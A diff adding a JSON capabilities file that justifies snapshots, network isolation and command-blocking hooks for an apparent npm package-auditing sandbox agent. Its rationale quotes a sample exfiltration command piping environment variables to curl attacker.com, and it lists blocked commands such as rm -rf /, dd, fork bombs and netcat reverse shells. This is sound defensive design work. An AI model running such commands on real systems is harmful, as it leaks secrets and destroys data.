@@ -1,0 +1,19 @@
+{
+  "capabilities": [
+    {
+      "id": "snapshots",
+      "why": "Snapshots enable instant rollback to a clean filesystem state after each package audit, allowing the agent to test risky packages without persistent contamination. The agent creates a snapshot before npm install, then restores it if the package exhibits high-risk behavior, ensuring the sandbox remains pristine for the next audit. This is essential for throughput because it avoids the 500ms boot time of creating fresh sandboxes for each of the 20+ eval runs.",
+      "evidence_path": "agent/auditor.py"
+    },
+    {
+      "id": "network_policy",
+      "why": "Network policy with mode 'off' provides kernel-level containment that prevents any outbound connections from the sandbox, which is the primary defense against supply-chain attacks that attempt to exfiltrate credentials, environment variables, or system information. Unlike application-level filtering, this cannot be bypassed by the guest OS or compromised packages. The containment test demonstrates that a malicious postinstall script attempting 'env | curl attacker.com' is blocked at the network layer with zero data leaving the sandbox.",
+      "evidence_path": "agent/auditor.py"
+    },
+    {
+      "id": "safety_hooks",
+      "why": "Safety hooks intercept every command before it reaches the guest, enabling the agent to block destructive commands (rm -rf /, dd, fork bombs) and exfiltration patterns (curl with env vars, netcat reverse shells) at the control plane level. This provides defense-in-depth beyond network policy: even if network were enabled, hooks would catch and log attempts. The hooks also produce the commands.jsonl audit trail required for compliance and the containment test evidence.",
+      "evidence_path": "agent/auditor.py"
+    }
+  ]
+}
